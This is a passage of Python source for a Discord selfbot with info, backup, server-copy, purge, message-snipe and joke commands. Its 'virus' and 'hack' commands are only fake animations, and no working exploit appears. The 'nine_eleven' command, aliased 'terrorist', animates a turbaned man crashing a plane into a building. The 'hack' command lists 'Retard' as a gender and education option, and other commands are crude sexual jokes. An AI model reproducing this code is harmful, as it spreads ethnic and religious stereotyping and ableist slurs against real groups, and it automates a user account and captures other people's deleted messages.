ctx.message.delete()\n    guild = ctx.guild\n    since_created = (ctx.message.created_at - role.created_at).days\n    role_created = role.created_at.strftime(\"%d %b %Y %H:%M\")\n    created_on = \"{} ({} days ago)\".format(role_created, since_created)\n    colorr = role.colour\n    users = len([x for x in guild.members if role in x.roles])\n    if str(role.colour) == \"#000000\":\n        colour = \"default\"\n        color = (\"#%06x\" % random.randint(0, 0xFFFFFF))\n        color = int(colour[1:], 16)\n    else:\n        colour = str(role.colour).upper()\n        color = role.colour\n    print(Fore.MAGENTA + f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Role Name: {Fore.RESET}{role.name}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created on: {Fore.RESET}{created_on}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Managed: {Fore.RESET}{role.managed}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Can Mention: {Fore.RESET}{role.mentionable}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Users: {Fore.RESET}{users}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Color: {Fore.RESET}{colorr}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Role ID: {Fore.RESET}{role.id}\\n\" + Fore.RESET)\n\n\n@client.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])\nasync def _backup_friends(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for friend in client.user.friends:\n       friendlist = (friend.name)+'#'+(friend.discriminator)   \n       with open('Backup/Friends.txt', 'a+') as f:\n           f.write(friendlist+\"\\n\" )\n    for block in client.user.blocked:\n        blocklist = (block.name)+'#'+(block.discriminator)\n        with open('Backup/Blocked.txt', 'a+') as f: \n            f.write(blocklist+\"\\n\" )\n\n@client.command()\nasync def memberinfo(ctx, *, user: discord.Member = None): # b'\\xfc'\n    await ctx.message.delete()\n    if user is None:\n        user = ctx.author      \n    dateformat = \"%a, %d %b %Y %I:%M %p\"\n    perm_string = ', '.join([str(p[0]).replace(\"_\", \" \").title() for p in user.guild_permissions if p[1]])\n    print(Fore.MAGENTA + f\"\\n{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Name: {Fore.RESET}{user}\" + Fore.RESET)\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} ID: {Fore.RESET}{user.id}\") \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Guild Permissons: {Fore.RESET}{perm_string}\\n\") \n    \n\n@client.command()\nasync def leavegroups(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for channel in client.private_channels:\n        if isinstance(channel, discord.GroupChannel):\n            await channel.leave()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Successfully Left Every Group\" + Fore.RESET)\n\n@client.command(aliases=['clearconsole', 'consoleclear'])\nasync def clearlog(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    Clear()\n    print(f''' \n   \n                                        █████╗░██████╗░██████╗░██╗████████╗\n                                        ██╔══██╗██╔══██╗██╔══██╗██║╚══██╔══╝\n                                        ██║░░██║██████╔╝██████╦╝██║░░░██║░░░\n                                        ██║░░██║██╔══██╗██╔══██╗██║░░░██║░░░\n                                        ╚█████╔╝██║░░██║██████╦╝██║░░░██║░░░\n                                        ░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░░╚═╝░░\n________________________________________________________________________________________________________________________\n                                             \n                                             {LIGHTMAGENTA}Connected: {RESET}{client.user.name}#{client.user.discriminator}\n                                             {LIGHTMAGENTA}Prefix: .{RESET} \n________________________________________________________________________________________________________________________                                              ''')\n\n\n\n\n        \n\n\n    \n\n\n@client.command()\nasync def discordid(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Discord ID: {RESET}{client.user.id}\" + Fore.RESET)\n\n@client.command()\nasync def serverid(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {ctx.guild.name}'s ID: {RESET}{ctx.guild.id}\" + Fore.RESET)\n\n@client.command()\nasync def dm(ctx, user : discord.Member): # b'\\xfc'\n    await ctx.message.delete()\n    user = client.get_user(user.id)\n    if ctx.author.id == client.user.id:\n        return\n    else:\n        try:\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {ctx.user.name}'s ID: {RESET}{client.get_user(user.id)}\" + Fore.RESET)\n        except:\n            pass   \n\n\n\n\n@client.command()\nasync def copy(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Successfully Copyed Server\" + Fore.RESET)\n    await client.create_guild(f'backup-{ctx.guild.name}')\n    await asyncio.sleep(4)\n    for g in client.guilds:\n        if f'backup-{ctx.guild.name}' in g.name:\n            for c in g.channels:\n                await c.delete()\n            for cate in ctx.guild.categories:\n                x = await g.create_category(f\"{cate.name}\")\n                for chann in cate.channels:\n                    if isinstance(chann, discord.VoiceChannel):\n                        await x.create_voice_channel(f\"{chann}\")\n                    if isinstance(chann, discord.TextChannel):\n                        await x.create_text_channel(f\"{chann}\")\n\n                \n\n                        \n    try:                \n        await g.edit(icon=ctx.guild.icon_url)\n    except:\n        pass\n\n\n\n@client.command()\nasync def purge(ctx, amount: int): # b'\\xfc'\n    await ctx.message.delete()\n    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == client.user).map(lambda m: m):\n        try:\n           await message.delete()\n        except:\n            pass\n\n@client.command(aliases=['markasread', 'ack'])\nasync def read(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for guild in client.guilds:\n        await guild.ack()\n\n@client.command()\nasync def empty(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send(chr(173))\n\n@client.command()\nasync def reverse(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    message = message[::-1]\n    await ctx.send(message)\n\n@client.command()\nasync def shrug(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    shrug = r'¯\\_(ツ)_/¯'\n    await ctx.send(shrug)\n\n@client.command()\nasync def lenny(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    lenny = '( ͡° ͜ʖ ͡°)'\n    await ctx.send(lenny)\n\n@client.command()\nasync def tableflip(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    tableflip = '(╯°□°）╯︵ ┻━┻'\n    await ctx.send(tableflip)\n\n@client.command()\nasync def unflip(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    unflip = '┬─┬ ノ( ゜-゜ノ)'\n    await ctx.send(unflip)\n\n@client.command()\nasync def bold(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    await ctx.send('**'+message+'**')\n\n@client.command()\nasync def exe(ctx, *, message):\n    await ctx.message.delete()\n    await ctx.send(f'{message}.exe⠀⠀                 ⎯⠀❐⠀⤬')\n\n@client.command()\nasync def encode(ctx, *, string): # b'\\xfc'\n    await ctx.message.delete()\n    decoded_stuff = base64.b64encode('{}'.format(string).encode('ascii'))\n    encoded_stuff = str(decoded_stuff)\n    encoded_stuff = encoded_stuff[2:len(encoded_stuff)-1]\n    await ctx.send(f\"> **Encoded Message:** \\n> {encoded_stuff}\")\n\n@client.command()\nasync def decode(ctx, *, string): # b'\\xfc'+\n    await ctx.message.delete()  \n    strOne = (string).encode(\"ascii\")\n    pad = len(strOne)%4\n    strOne += b\"=\"*pad\n    encoded_stuff = codecs.decode(strOne.strip(),'base64')\n    decoded_stuff = str(encoded_stuff)\n    decoded_stuff = decoded_stuff[2:len(decoded_stuff)-1]\n    await ctx.send(f\"> **Decoded Message:** \\n> {decoded_stuff}\")\n\n#fun\n\n@client.command()\nasync def fun(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ```Fun Commands \\n> .minesweeper / plays a fun little game (try not to get bombed!) \\n> .dog / sends a doggo pic \\n> .cat / sends cat pic \\n> .fox / sends fox pic \\n> .sadcat / sends sad cat \\n> .bird / sends bird pic \\n> .cum / you will see... \\n> .nine_eleven / yeah.. \\n> .dsize (user) / shows dick size \\n> .wyr / sends a would you rather in chat \\n> .devowel (message) / no vowels today \\n> .8ball (question) / yes or no \\n> .hack (user) / tottaly real hack \\n> .poll (question) \\n> .rainbow (user) / turns role rainbow \\n> .exe (message) / turns your message to exe \\n> .virus (user) / injects trojan into person \\n> .fortnite / shows fortnite player doing defualt dance```')\n\n@client.command()\nasync def virus(ctx, user: discord.Member = None, *, virus: str = \"trojan\"):\n        user = user or ctx.author\n        list = (\n            f\"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``\",\n            f\"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``\",\n            f\"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \\ {virus}-virus.exe Packing files..``\",\n            f\"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``\",\n            f\"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``\",\n            f\"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``\",\n            f\"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \\ {virus}-virus.exe Packing files..``\",\n            f\"``Successfully downloaded {virus}-virus.exe``\",\n            \"``Injecting virus.   |``\",\n            \"``Injecting virus..  /``\",\n            \"``Injecting virus... -``\",\n            f\"``Successfully Injected {virus}-virus.exe into {user.name}``\",\n        )\n        for i in list:\n            await asyncio.sleep(1.5)\n            await ctx.message.edit(content=i)\n\n@client.command()\nasync def fortnite(ctx):\n    await ctx.message.delete()\n    message = await ctx.send(\"\"\"```\n    ⣀⣤\n⠀⠀⠀⠀⣿⠿⣶\n⠀⠀⠀⠀⣿⣿⣀\n⠀⠀⠀⣶⣶⣿⠿⠛⣶\n⠤⣀⠛⣿⣿⣿⣿⣿⣿⣭⣿⣤\n⠒⠀⠀⠀⠉⣿⣿⣿⣿⠀⠀⠉⣀\n⠀⠤⣤⣤⣀⣿⣿⣿⣿⣀⠀⠀⣿\n⠀⠀⠛⣿⣿⣿⣿⣿⣿⣿⣭⣶⠉\n⠀⠀⠀⠤⣿⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⣭⣿⣿⣿⠀⣿⣿⣿\n⠀⠀⠀⣉⣿⣿⠿⠀⠿⣿⣿\n⠀⠀⠀⠀⣿⣿⠀⠀⠀⣿⣿⣤\n⠀⠀⠀⣀⣿⣿⠀⠀⠀⣿⣿⣿\n⠀⠀⠀⣿⣿⣿⠀⠀⠀⣿⣿⣿\n⠀⠀⠀⣿⣿⠛⠀⠀⠀⠉⣿⣿\n⠀⠀⠀⠉⣿⠀⠀⠀⠀⠀⠛⣿\n⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣿⣿\n⠀⠀⠀⠀⣛⠀⠀⠀⠀⠀⠀⠛⠿⠿⠿\n⠀⠀⠀⠛⠛\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n   ⣀⣶⣀\n⠀⠀⠀⠒⣛⣭\n⠀⠀⠀⣀⠿⣿⣶\n⠀⣤⣿⠤⣭⣿⣿\n⣤⣿⣿⣿⠛⣿⣿⠀⣀\n⠀⣀⠤⣿⣿⣶⣤⣒⣛\n⠉⠀⣀⣿⣿⣿⣿⣭⠉\n⠀⠀⣭⣿⣿⠿⠿⣿\n⠀⣶⣿⣿⠛⠀⣿⣿\n⣤⣿⣿⠉⠤⣿⣿⠿\n⣿⣿⠛⠀⠿⣿⣿\n⣿⣿⣤⠀⣿⣿⠿\n⠀⣿⣿⣶⠀⣿⣿⣶\n⠀⠀⠛⣿⠀⠿⣿⣿\n⠀⠀⠀⣉⣿⠀⣿⣿\n⠀⠶⣶⠿⠛⠀⠉⣿\n⠀⠀⠀⠀⠀⠀⣀⣿\n⠀⠀⠀⠀⠀⣶⣿⠿\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀\n⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿\n⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿\n⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⣀\n⠀⠿⣿⣿⣀\n⠀⠉⣿⣿⣀\n⠀⠀⠛⣿⣭⣀⣀⣤\n⠀⠀⣿⣿⣿⣿⣿⠛⠿⣶⣀\n⠀⣿⣿⣿⣿⣿⣿⠀⠀⠀⣉⣶\n⠀⠀⠉⣿⣿⣿⣿⣀⠀⠀⣿⠉\n⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿\n⠀⣀⣿⣿⣿⣿⣿⣿⣿⣿⠿\n⠀⣿⣿⣿⠿⠉⣿⣿⣿⣿\n⠀⣿⣿⠿⠀⠀⣿⣿⣿⣿\n⣶⣿⣿⠀⠀⠀⠀⣿⣿⣿\n⠛⣿⣿⣀⠀⠀⠀⣿⣿⣿⣿⣶⣀\n⠀⣿⣿⠉⠀⠀⠀⠉⠉⠉⠛⠛⠿⣿⣶\n⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿\n⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉\n⣀⣶⣿⠛\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⠀⣀⣀\n⠀⠀⠀⠀⠀⠀⣿⣿⣿⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿\n⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣶⣿⣿⣿⣶⣶⣤⣶⣶⠶⠛⠉⠉\n⠀⠀⠀⠀⠀⠀⣤⣿⠿⣿⣿⣿⣿⣿⠀⠀⠉\n⠛⣿⣤⣤⣀⣤⠿⠉⠀⠉⣿⣿⣿⣿\n⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠉⣿⣿⣿⣀\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠛\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣛⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠛⠿⣿⣿⣿⣶⣤\n⠀⠀⠀⠀⠀⠀⠀⣿⠛⠉⠀⠀⠀⠛⠿⣿⣿⣶⣀\n⠀⠀⠀⠀⠀⠀⣿⣀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣤\n⠀⠀⠀⠀⠀⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠉⠉\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⣤⣶⣶\n⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣀⣀\n⠀⠀⠀⠀⠀⣀⣶⣿⣿⣿⣿⣿⣿\n⣤⣶⣀⠿⠶⣿⣿⣿⠿⣿⣿⣿⣿\n⠉⠿⣿⣿⠿⠛⠉⠀⣿⣿⣿⣿⣿\n⠀⠀⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣤⣤\n⠀⠀⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿\n⠀⠀⠀⠀⣀⣿⣿⣿⠿⠉⠀⠀⣿⣿⣿⣿\n⠀⠀⠀⠀⣿⣿⠿⠉⠀⠀⠀⠀⠿⣿⣿⠛\n⠀⠀⠀⠀⠛⣿⣿⣀⠀⠀⠀⠀⠀⣿⣿⣀\n⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠿⣿⣿\n⠀⠀⠀⠀⠀⠉⣿⣿⠀⠀⠀⠀⠀⠀⠉⣿\n⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⣀⣿\n⠀⠀⠀⠀⠀⠀⣀⣿⣿\n⠀⠀⠀⠀⠤⣿⠿⠿⠿\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⣀\n⠀⠀⣶⣿⠿⠀⠀⠀⣀⠀⣤⣤\n⠀⣶⣿⠀⠀⠀⠀⣿⣿⣿⠛⠛⠿⣤⣀\n⣶⣿⣤⣤⣤⣤⣤⣿⣿⣿⣀⣤⣶⣭⣿⣶⣀\n⠉⠉⠉⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⠛⠛⠿⠿\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⠛⠿⣿⣤\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⠀⣿⣿⣤\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⣶⣿⠛⠉\n⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠀⠀⠉\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⣶⣿⣶\n⠀⠀⠀⣤⣤⣤⣿⣿⣿\n⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣶\n⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿\n⠀⠀⣿⣉⣿⣿⣿⣿⣉⠉⣿⣶\n⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿\n⠀⣤⣿⣿⣿⣿⣿⣿⣿⠿⠀⣿⣶\n⣤⣿⠿⣿⣿⣿⣿⣿⠿⠀⠀⣿⣿⣤\n⠉⠉⠀⣿⣿⣿⣿⣿⠀⠀⠒⠛⠿⠿⠿\n⠀⠀⠀⠉⣿⣿⣿⠀⠀⠀⠀⠀⠀⠉\n⠀⠀⠀⣿⣿⣿⣿⣿⣶\n⠀⠀⠀⠀⣿⠉⠿⣿⣿\n⠀⠀⠀⠀⣿⣤⠀⠛⣿⣿\n⠀⠀⠀⠀⣶⣿⠀⠀⠀⣿⣶\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠉\n```\"\"\")\n    await asyncio.sleep(1)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶\n⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶\n⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤\n⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀\n⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿\n⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶\n⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒\n⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉\n⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛\n⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭\n⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤\n⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿\n⠀⠀⠀⠀⠀⠀⣿⠛\n⠀⠀⠀⠀⠀⠀⣭⣶\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿\n⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀\n⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀\n⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤\n⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿\n⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉\n⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉\n⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀\n⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿\n⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿\n⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛\n```\"\"\")\n    await asyncio.sleep(0)\n    await message.edit(content=\"\"\"```\n⠀⠀⠀⣶⣿⣶\n⠀⠀⠀⣿⣿⣿⣀\n⠀⣀⣿⣿⣿⣿⣿⣿\n⣶⣿⠛⣭⣿⣿⣿⣿\n⠛⠛⠛⣿⣿⣿⣿⠿\n⠀⠀⠀⠀⣿⣿⣿\n⠀⠀⣀⣭⣿⣿⣿⣿⣀\n⠀⠤⣿⣿⣿⣿⣿⣿⠉\n⠀⣿⣿⣿⣿⣿⣿⠉\n⣿⣿⣿⣿⣿⣿\n⣿⣿⣶⣿⣿\n⠉⠛⣿⣿⣶⣤\n⠀⠀⠉⠿⣿⣿⣤\n⠀⠀⣀⣤⣿⣿⣿\n⠀⠒⠿⠛⠉⠿⣿\n⠀⠀⠀⠀⠀⣀⣿⣿\n⠀⠀⠀⠀⣶⠿⠿⠛\n```\"\"\")\n\n@client.command()\nasync def combine(ctx, name1, name2): # b'\\xfc'\n    await ctx.message.delete()\n    name1letters = name1[:round(len(name1) / 2)]\n    name2letters = name2[round(len(name2) / 2):]\n    ship = \"\".join([name1letters, name2letters])\n    emb = (discord.Embed(description=f\"{ship}\"))\n    emb.set_author(name=f\"{name1} + {name2}\")\n    await ctx.send(embed=emb)       \n\n@client.command(aliases=['rainbowrole'])\nasync def rainbow(ctx, *, role):\n    await ctx.message.delete()\n    role = discord.utils.get(ctx.guild.roles, name=role)\n    while True:\n        try:\n            await role.edit(role=role, colour=RandomColor())\n            await asyncio.sleep(10)\n        except:\n            break\n\n@client.command()\nasync def poll(ctx, *, option1):\n    await ctx.message.delete()\n    message = await ctx.send(\n        f'> **Poll**: \\n> {option1}')\n    await message.add_reaction('✅')\n    await message.add_reaction('❌')\n\nclient.snipe_history_dict = {}\nclient.sniped_message_dict = {}\n\n@client.command(aliases=[\"9/11\", \"911\", \"terrorist\"])\nasync def nine_eleven(ctx):\n    await ctx.message.delete()\n    invis = \"\"  # char(173)\n    message = await ctx.send(f'''\n{invis}:man_wearing_turban::airplane:    :office:           \n''')\n    await asyncio.sleep(0.5)\n    await message.edit(content=f'''\n{invis} :man_wearing_turban::airplane:   :office:           \n''')\n    await asyncio.sleep(0.5)\n    await message.edit(content=f'''\n{invis}  :man_wearing_turban::airplane:  :office:           \n''')\n    await asyncio.sleep(0.5)\n    await message.edit(content=f'''\n{invis}   :man_wearing_turban::airplane: :office:           \n''')\n    await asyncio.sleep(0.5)\n    await message.edit(content=f'''\n{invis}    :man_wearing_turban::airplane::office:           \n''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n        :boom::boom::boom:    \n        ''')\n\n@client.command()\nasync def snipe(ctx):\n    await ctx.message.delete()\n    currentChannel = ctx.channel.id\n    if currentChannel in client.sniped_message_dict:\n        await ctx.send(client.sniped_message_dict[currentChannel])\n    else:\n        await ctx.send(\"No message to snipe!\", delete_after=3)          \n\n\n@client.command()\nasync def hack(ctx, user: discord.Member = None):\n    await ctx.message.delete()\n    gender = [\"Male\", \"Female\", \"Trans\", \"Other\", \"Retard\"]\n    age = str(random.randrange(10, 25))\n    height = [\n        '4\\'6\\\"', '4\\'7\\\"', '4\\'8\\\"', '4\\'9\\\"', '4\\'10\\\"', '4\\'11\\\"', '5\\'0\\\"',\n        '5\\'1\\\"', '5\\'2\\\"', '5\\'3\\\"', '5\\'4\\\"', '5\\'5\\\"', '5\\'6\\\"', '5\\'7\\\"',\n        '5\\'8\\\"', '5\\'9\\\"', '5\\'10\\\"', '5\\'11\\\"', '6\\'0\\\"', '6\\'1\\\"', '6\\'2\\\"',\n        '6\\'3\\\"', '6\\'4\\\"', '6\\'5\\\"', '6\\'6\\\"', '6\\'7\\\"', '6\\'8\\\"', '6\\'9\\\"',\n        '6\\'10\\\"', '6\\'11\\\"'\n    ]\n    weight = str(random.randrange(60, 300))\n    hair_color = [\"Black\", \"Brown\", \"Blonde\", \"White\", \"Gray\", \"Red\"]\n    skin_color = [\"White\", \"Pale\", \"Brown\", \"Black\", \"Light-Skin\"]\n    religion = [\n        \"Christian\", \"Muslim\", \"Atheist\", \"Hindu\", \"Buddhist\", \"Jewish\"\n    ]\n    sexuality = [\n        \"Straight\", \"Gay\", \"Homo\", \"Bi\", \"Bi-Sexual\", \"Lesbian\", \"Pansexual\"\n    ]\n    education = [\n        \"High School\", \"College\", \"Middle School\", \"Elementary School\",\n        \"Pre School\", \"Retard never went to school LOL\"\n    ]\n    ethnicity = [\n        \"White\", \"African American\", \"Asian\", \"Latino\", \"Latina\", \"American\",\n        \"Mexican\", \"Korean\", \"Chinese\", \"Arab\", \"Italian\", \"Puerto Rican\",\n        \"Non-Hispanic\", \"Russian\", \"Canadian\", \"European\", \"Indian\"\n    ]\n    occupation = [\n        